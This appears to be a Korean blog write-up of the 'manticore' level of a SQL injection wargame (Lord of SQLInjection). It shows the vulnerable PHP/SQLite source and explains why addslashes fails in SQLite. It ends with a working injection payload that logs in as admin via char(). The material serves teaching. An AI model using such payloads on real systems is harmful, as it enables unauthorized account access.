---
title : "LOS Lv.38 manticore (풀이 봄)"
excerpt : "LOS Lv.38 manticore (풀이 봄)"
toc: true
toc_sticky: true
categories :
  - rubiya
---

## manticore
```php
query : select id from member where id='' and pw=''

<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/manticore.db");
  $_GET['id'] = addslashes($_GET['id']);
  $_GET['pw'] = addslashes($_GET['pw']);
  $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id'] == "admin") solve("manticore");
  highlight_file(__FILE__);
?>
```

## Solution
```
%a1~%fe -> 안됨!
```
풀이 봄.  
<a href="https://blog.limelee.xyz/entry/LOS-manticore?category=711778" target="_blank">https://blog.limelee.xyz/entry/LOS-manticore?category=711778</a>

```
sqlite는 '\'을 통해 escape string을 처리하지 않음.

-> id='\\' 이렇게 하면 db에는 id 값에 그냥 '\\'이 들어감!
-> sqlite에서는 single quote를 두 개를 써서 escape 처리함.
```

<a href="http://www.devkuma.com/books/pages/1273" target="_blank">http://www.devkuma.com/books/pages/1273</a>

```
따라서 그냥 id='\'' 이렇게 된다면 escape 처리가 되지 않는다는 것이므로

그냥 ?id=' or id=0x61646D696E --%20이라고 하면?

id='\' or id=0x61646D696E -- ' -> 실패함
```
```
이유는 "hexadecimal integer literals are not considered well-formed and are stored as TEXT."

-> 16진수 정수 리터럴은 올바른 형식으로 구성되지 않은 것으로 간주되어 TEXT로 저장됨.

따라서 hex 값을 넣어도 mysql처럼 바뀌지 않고 TEXT로 들어가서 검색이 안된 것임.

single quote를 못쓰므로 char 함수를 이용해서 값을 넣으면 됨. 
```
sqlite online : <a href="https://sqliteonline.com/" target="_blank">https://sqliteonline.com/</a>
```
?id=' or id=char(97,100,109,105,110) --%20
```